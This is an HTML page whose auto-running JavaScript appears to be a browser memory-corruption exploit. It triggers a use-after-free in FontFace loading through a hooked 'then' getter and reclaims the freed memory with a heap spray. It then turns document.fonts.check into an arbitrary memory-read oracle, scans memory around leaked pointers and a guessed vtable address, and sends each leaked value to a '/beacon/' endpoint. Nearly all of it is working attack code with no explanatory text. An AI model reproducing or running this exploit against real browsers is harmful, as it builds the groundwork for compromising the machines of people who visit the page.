<!DOCTYPE html><html><head><meta charset="utf-8"><title>T7f</title></head>
<body><pre id="O">T7f</pre>
<script>
'use strict';
function bs(t){try{var x=new XMLHttpRequest();x.open('GET','/beacon/T7f-'+encodeURIComponent(t),false);x.send(null);}catch(e){}}
bs('BOOT');
var K=1024,PF=500,SZ=192,fired=false,faces=null,AT=0;

function le48(v,o){return v[o]+v[o+1]*0x100+v[o+2]*0x10000+v[o+3]*0x1000000+v[o+4]*0x100000000+v[o+5]*0x10000000000;}
function hex(x){return '0x'+Math.round(x).toString(16);}
function hx(x){return x.toString(16);}
function wr48(u,o,x){for(var k=0;k<6;k++){u[o+k]=x%256;x=Math.floor(x/256);}u[o+6]=0;u[o+7]=0;}
function put32(u,o,x){u[o]=x&0xFF;u[o+1]=(x>>8)&0xFF;u[o+2]=(x>>16)&0xFF;u[o+3]=(x>>24)&0xFF;}
function align256(x){return Math.floor(x/256)*256;}

window.__pf=[];for(var pfi=0;pfi<PF;pfi++)window.__pf.push(new Uint8Array(new ArrayBuffer(SZ)));

function start(){
  AT++;if(AT>1)return;
  try{if(sessionStorage.getItem('uaf')){bs('DOUBLE');return;}sessionStorage.setItem('uaf','1');}catch(e){}
  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){return;}
  try{document.fonts.add(vf);}catch(e){}
  try{void vf.loaded;}catch(e){}
  var fs=document.createElement('style');
  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
  document.head.appendChild(fs);
  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
    if(fired)return undefined;fired=true;
    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
    try{document.body.offsetHeight;}catch(e){}
    window.__sp=[];
    for(var k=0;k<K;k++){
      var w=new Uint8Array(new ArrayBuffer(SZ));
      w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
      w[0x82]=3;
      w[0x38]=0x00;w[0x39]=0x10;w[0x3A]=0x00;w[0x3B]=0x00;
      w[0x3C]=0x00;w[0x3D]=0x20;w[0x3E]=0x00;w[0x3F]=0x00;
      window.__sp.push(w);
    }
    return undefined;
  },set:function(){}});
  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;setTimeout(phase,100);},function(){});
}

function phase(){
  var bufs=[],L1=0,L2=0;
  for(var i=0;i<window.__sp.length;i++){
    var a=le48(window.__sp[i],0x58);
    if(a>0x1000000000){
      var b2=le48(window.__sp[i],0x68);
      if(L1===0){L1=a;L2=b2;}
      bufs.push([window.__sp[i],b2,i]);
    }
  }
  bs('L1='+hex(L1)+'-L2='+hex(L2)+'-bufs='+bufs.length);
  if(!bufs.length){bs('NOLEAK');return;}
  var h0=bufs[0][0];

  for(var ib=0;ib<bufs.length;ib++){
    var vb=bufs[ib][0];
    vb[0]=2;wr48(vb,0x08,bufs[ib][1]);wr48(vb,0x10,0);vb[0x82]=0;
    wr48(vb,0x20,0);put32(vb,0x28,0);put32(vb,0x2C,0);
  }
  setTimeout(function(){
    bs('FACES='+faces.length);
    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
    setTimeout(function(){
      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
      setTimeout(function(){
        var zi=-1;
        for(var q=0;q<faces.length;q++){
          var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){r='EX';}
          if(r===false){zi=q;break;}
        }
        bs('ZI='+zi);
        if(zi<0){bs('NOORACLE');return;}

        function setR(addr){for(var ir=0;ir<bufs.length;ir++)wr48(bufs[ir][0],0x20,addr);}
        function chk(c){try{return document.fonts.check('1em zz'+zi,String.fromCodePoint(c))===false;}catch(e){return null;}}

        for(var ip=0;ip<bufs.length;ip++){
          bufs[ip][0][0x82]=0;
          put32(bufs[ip][0],0x38,0x1000);put32(bufs[ip][0],0x3C,0x2000);
          wr48(bufs[ip][0],0x20,L2);
          bufs[ip][0][0x28]=1;bufs[ip][0][0x2C]=1;
        }

        bs('SCAN1');
        var self=0,n3=0;
        var anchors=[align256(L1),align256(L2)];
        for(var an=0;an<anchors.length&&!self;an++){
          var cS=anchors[an]-0x400000,cE=anchors[an]+0x400000;
          if(cS<0x10000)cS=0x10000;
          for(var a=cS;a<cE&&!self;a+=128){
            setR(a+0x38);n3++;
            if(chk(0x1000)===true&&chk(0xFFF)===false&&chk(0x2000)===true&&chk(0x2001)===false){
              self=a;bs('SELF='+hex(a));
            }
          }
        }
        bs('SCAN1-END-n='+n3);
        if(!self){bs('NOSELF');}

        // Enhanced range reader — handles ALL cases including to >= 0x10FFFF
        // Returns [from, to]. [-2,-2] = empty (from > to or from > unicode max)
        function rr(addr){
          setR(addr);
          var c0=(chk(0)===false),cM=(chk(0x10FFFF)===false);
          if(c0&&cM)return[0,0x10FFFF];
          if(c0){
            var lo=0,hi=0x10FFFF;
            while(lo<hi){var m=(lo+hi+1)>>>1;if(chk(m)===false)lo=m;else hi=m-1;}
            return[0,lo];
          }
          if(cM){
            var lo2=1,hi2=0x10FFFF;
            while(lo2<hi2){var m2=(lo2+hi2)>>>1;if(chk(m2)===true)lo2=m2+1;else hi2=m2;}
            return[lo2,0x10FFFF];
          }
          var lo3=1,hi3=0x10FFFF;
          while(lo3<hi3){var m3=(lo3+hi3)>>>1;if(chk(m3)===true)lo3=m3+1;else hi3=m3;}
          if(chk(lo3)===true)return[-2,-2];
          var fr=lo3;
          var lo4=fr,hi4=0x10FFFF;
          while(lo4<hi4){var m4=(lo4+hi4+1)>>>1;if(chk(m4)===false)lo4=m4;else hi4=m4-1;}
          return[fr,lo4];
        }

        function rf(r){return r[0]===-2?'E':hx(r[0])+'/'+hx(r[1]);}

        // Phase A: s2 sweep of L2 (from=bytes[2..5], to=bytes[6..9])
        bs('A');
        var l2off=[-0x18,-0x10,-0x08,0x00,0x08,0x10,0x18,0x20,0x28,0x30,0x38];
        var l2s2r=[];
        for(var j=0;j<l2off.length;j++){
          var r=rr(L2+l2off[j]+2);
          l2s2r.push(r);
          bs('L2s2['+l2off[j].toString(16)+']='+rf(r));
        }

        // Phase B: s4 at key L2 offsets (from=bytes[4..7], to=bytes[8..11])
        bs('B');
        var l2s4off=[0x00,0x08,0x18,0x20];
        for(var j2=0;j2<l2s4off.length;j2++){
          bs('L2s4['+l2s4off[j2].toString(16)+']='+rf(rr(L2+l2s4off[j2]+4)));
        }

        // Phase C: s6 cross-reads (from=bytes[6..9], to=bytes[10..13])
        // s6 at L2[0]: from = L2[0]b6b7 + L2[8]b0b1; to = L2[8]b2345
        // s6 at L2[8]: from = L2[8]b6b7 + L2[10]b0b1; to = L2[10]b2345
        bs('C');
        bs('L2s6[0]='+rf(rr(L2+6)));
        bs('L2s6[8]='+rf(rr(L2+0x0E)));
        bs('L2s6[-8]='+rf(rr(L2-2)));

        // Phase D: s3 at L2[0] (from=bytes[3..6], cross-check byte3+byte4)
        bs('D');
        bs('L2s3[0]='+rf(rr(L2+3)));

        // Phase E: s2 sweep of L1
        bs('E');
        var l1off=[-0x10,-0x08,0x00,0x08,0x10,0x18,0x20,0x28,0x30];
        for(var j3=0;j3<l1off.length;j3++){
          bs('L1s2['+l1off[j3].toString(16)+']='+rf(rr(L1+l1off[j3]+2)));
        }

        // Phase F: s4 at key L1 offsets
        bs('F');
        bs('L1s4[0]='+rf(rr(L1+4)));
        bs('L1s4[8]='+rf(rr(L1+0x0C)));
        bs('L1s4[18]='+rf(rr(L1+0x1C)));

        // Phase G: If L2[0] s2 from is in text range [0x80000,0x8FFFF],
        // assume vtable and read at VT = text_base + VT_DELTA
        var l2_0 = l2s2r[3];
        if(l2_0[0]>=0x80000 && l2_0[0]<=0x8FFFF){
          bs('G-VT');
          var VT=0x800000000+0x1710B78;
          bs('VT='+hex(VT));
          bs('VT[0]s2='+rf(rr(VT+2)));
          bs('VT[8]s2='+rf(rr(VT+0x0A)));
          bs('VT[0]s4='+rf(rr(VT+4)));
        } else {
          bs('G-SKIP-L2[0]s2f='+hx(l2_0[0]));
        }

        // Restore oracle
        put32(h0,0x38,0x1000);put32(h0,0x3C,0x2000);
        if(self)setR(self+0x38);

        bs('DONE');
        document.getElementById('O').textContent='T7f DONE';
      },50);
    },50);
  },50);
}
if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
else document.addEventListener('DOMContentLoaded',start);
</script></body></html>
